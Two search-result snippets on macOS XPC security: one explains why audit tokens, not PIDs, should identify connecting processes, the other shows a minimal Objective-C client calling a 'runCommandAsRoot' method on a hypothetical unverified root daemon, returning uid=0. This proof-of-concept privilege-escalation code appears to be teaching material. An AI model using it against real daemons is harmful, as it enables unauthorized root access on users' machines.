results.snippet: One of those recommendations was to use the audit token rather than PID when checking the connecting process. Since the audit token APIs aren’t public I thought it would be interesting to take a closer look at what audit tokens actually are and where they come from. The issue with this is since it only uses PID to locate the process, and PIDs wrap around and can be reused, it’s possible to race the code signing verification and trick it into checking a different binary. As we’ll see shortly, making use of the `auditToken` allows the Security framework to use the internal fields to ensure the connecting process is the one the XPC service thinks it is. Now that we know some of the history behind the audit token lets actually take a look at what it is and how the kernel implements and stores it.

tavily.snippet: Client Process (user context) ↓ NSXPCConnection / xpc_connection_create_mach_service() ↓ Mach message via launchd Daemon Process (root context) ↓ Receives XPC message ↓ (Should verify client identity / entitlements) ↓ Performs privileged operation. // Minimal XPC client — connect to a LaunchDaemon's Mach service #import  @protocol VulnDaemonProtocol - (void)runCommandAsRoot:(NSString *)command withReply:(void (^)(NSString *))reply; @end int main(void) { @autoreleasepool { NSXPCConnection *conn = [[NSXPCConnection alloc] initWithMachServiceName:@"com.example.vulndaemon" options:NSXPCConnectionPrivileged]; conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(VulnDaemonProtocol)]; [conn resume]; id proxy = [conn remoteObjectProxyWithErrorHandler:^(NSError *error) { NSLog(@"Connection error: %@", error); }]; // If the daemon doesn't verify our identity, this works: [proxy runCommandAsRoot:@"id" withReply:^(NSString *result) { NSLog(@"Result: %@", result); // Output: uid=0(root) }]; [[NSRunLoop currentRunLoop] run]; } }.
